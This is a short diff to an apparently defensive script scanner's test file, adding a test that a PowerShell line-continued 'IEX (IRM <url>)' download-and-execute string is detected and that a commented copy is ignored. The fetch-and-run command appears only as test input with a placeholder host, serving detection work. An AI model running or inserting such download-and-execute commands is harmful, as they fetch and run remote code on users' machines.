@@ -37,3 +37,9 @@ def test_scan_reports_zip_script_advisory_and_malformed_link(tmp_path):
     assert result["files"] == 2 and result["skipped"] == 1
     assert result["findings"][0]["source"] == "euristica statica BC"
     assert "isolate_path" not in result["findings"][0]
+
+def test_powershell_continuation_preserves_download_flow():
+    for newline in ("\n", "\r\n"):
+        continued = f"IEX (`{newline}  IRM 'https://example.invalid')"
+        assert inspect_script(continued.encode(), ".ps1")
+        assert not inspect_script(f"# {continued}".encode(), ".ps1")
